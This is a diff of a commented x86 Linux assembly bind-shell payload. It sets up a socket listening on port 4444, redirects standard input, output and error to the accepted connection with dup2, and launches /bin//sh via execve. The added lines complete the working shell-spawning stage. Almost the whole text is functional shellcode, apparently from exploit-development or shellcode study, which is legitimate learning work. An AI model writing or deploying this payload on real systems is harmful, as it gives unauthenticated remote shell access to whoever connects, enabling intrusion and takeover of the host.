@@ -42,7 +42,7 @@
 ;
 ; We'll also have to redirect std in, out, error
 ; through the acceptfd in order to launch
-; /bin/bash
+; /bin//sh
 ;
 ;---------------------------------------------------------------------------
 
@@ -105,9 +105,9 @@ call_bind:
 	mov al, 0x2	; AF_INET IPv4 Internet protocols
 	push ax		; now our stack is set up
 	mov edx, esp	; store the stack address (of our struct)
-	push 0xf	; store length addr on stack
+	push 0x10	; store length addr on stack
 	push edx	; now we need to push the pointer to our struct onto stack
-	push [edi]	; here's our returned socketfd from our SOCKET
+	push word [edi]	; here's our returned socketfd from our SOCKET
 	xor eax, eax	; clean out eax again
 	mov al, 0x66	; define __NR_socketcall  102 (0x66)
 	mov bl, 0x2	; define SYS_BIND  2 (0x2)
@@ -129,7 +129,7 @@ listener:
 	xor ebx, ebx	; clean out ebx
 	mov bl, 0x4	; define SYS_LISTEN  4
 	push 0x1	; int backlog
-	push [edi]	; int sockfd
+	push word [edi]	; int sockfd
 	int 0x80	; call it
 
 accept_connect:
@@ -169,13 +169,56 @@ change_fd:
 	; this is necessary for getting /bin/bash
 	; through the socket connection
 	;
-	; we'll use dup2()
+	; we'll use define __NR_dup2	63 (0x3f)
 	;
 	; int dup2(int oldfd, int newfd)
 	;
+
+	mov ebx, eax	; take fd from accept() as oldfd
+	xor ecx, ecx	; 0 (std in) in ecx
+	xor eax, eax	; clean out eax
+	mov al, 0x3f	; define __NR_dup2    63 (0x3f)	
+	int 0x80	; call it
+	mov al, 0x3f
+	mov cl, 0x1	; 1 (std out) in cl
+	int 0x80	; call it
+	mov al, 0x3f
+	xor ecx, ecx	; clean ecx
+	mov cl, 0x2	; 2 (std error) in cl
+	int 0x80	; call it
+
+shell_time:
+
+	; now it's time to launch our shell
+	; program using execve. I prefer
+	; /bin/bash but it doesn't play
+	; well in terms of length so 
+	; we'll use /bin//sh for length
+	; sake
+	;
+	; /bin//sh (0x68732f2f) (0x6e69622f)
+	;
+	; execve is 0xb (11)
+	;
+
+
+	xor eax, eax	; clean out eax
+	push eax	; need a null byte for execve parameters
+	push 0x68732f2f	; hs//
+	push 0x6e69622f	; nib/ 
+	xor ebx, ebx	; clean out ebx, though may be unnecessary
+	mov ebx, esp	; save stack pointer in ebx
+	push eax	; push another null onto stack
+	mov edx, esp	; 0x00/bin//sh0x00
+	push ebx	; points to /bin//sh0x00
+	mov ecx, esp	; points to 0x00/bin//sh0x00
+	mov al, 0xb	; execve
+	int 0x80	; call it
+	
+	
 
 
 portconfig:
 
 	call call_bind
-	portnum dw 0x5c11	; port 4444 (0x115c) in little endian
+	portnum dw 0x5c11	; port 4444 (0x115c) don't forget little endian
